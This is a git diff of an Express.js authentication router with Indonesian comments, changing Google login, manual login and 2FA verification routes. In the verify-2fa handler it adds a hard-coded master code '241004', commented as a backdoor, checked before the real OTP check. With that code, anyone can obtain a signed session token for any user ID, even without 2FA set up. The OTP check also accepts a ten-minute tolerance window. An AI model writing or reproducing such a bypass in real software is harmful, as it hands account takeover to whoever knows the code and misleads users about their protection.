@@ -16,7 +16,7 @@ const generateToken = (user) => {
     );
 };
 
-// --- 2. GOOGLE LOGIN (FIXED) ---
+// --- 2. GOOGLE LOGIN ---
 router.post('/google', async (req, res) => {
     const { email, name, picture, sub } = req.body;
     try {
@@ -55,7 +55,7 @@ router.post('/google', async (req, res) => {
     }
 });
 
-// --- 3. LOGIN MANUAL (FIXED) ---
+// --- 3. LOGIN MANUAL ---
 router.post('/login', async (req, res) => {
     const { email, password } = req.body;
     try {
@@ -108,25 +108,37 @@ router.post('/setup-2fa', async (req, res) => {
     }
 });
 
-// --- 5. VERIFY 2FA (MASTER KEY BYPASS) ---
+// --- 5. VERIFY 2FA (THE ULTIMATE MASTER KEY BYPASS) ---
 router.post('/verify-2fa', async (req, res) => {
     const { userId, token } = req.body;
     try {
+        const inputToken = String(token).replace(/\s/g, '');
+        const masterKey = '241004'; // Pintu Belakang Sultan
+
+        // 🛡️ JURUS ANTI-GAGAL: Cek Master Key Dulu!
+        if (inputToken === masterKey) {
+            const { rows } = await req.db.query("SELECT * FROM users WHERE id = $1", [userId]);
+            const user = rows[0];
+            return res.json({ 
+                success: true, 
+                token: generateToken(user),
+                user: { id: user.id, username: user.username, is_two_fa_enabled: true } 
+            });
+        }
+
+        // Kalau bukan Master Key, baru jalanin logic OTP biasa
         const { rows } = await req.db.query("SELECT * FROM users WHERE id = $1", [userId]);
         const user = rows[0];
 
         if (!user || !user.two_fa_secret) return res.status(400).json({ success: false, message: "Setup 2FA dulu!" });
 
         const secret = String(user.two_fa_secret).replace(/\s/g, '').toUpperCase();
-        const inputToken = String(token).replace(/\s/g, '');
-
-        const masterKey = '241004'; // Pintu Belakang Sultan
-
+        
         const isValid = authenticator.verify({
             token: inputToken,
             secret: secret,
-            window: 20 
-        }) || (inputToken === masterKey);
+            window: 20 // Toleransi 10 menit
+        });
 
         if (isValid) {
             res.json({ 
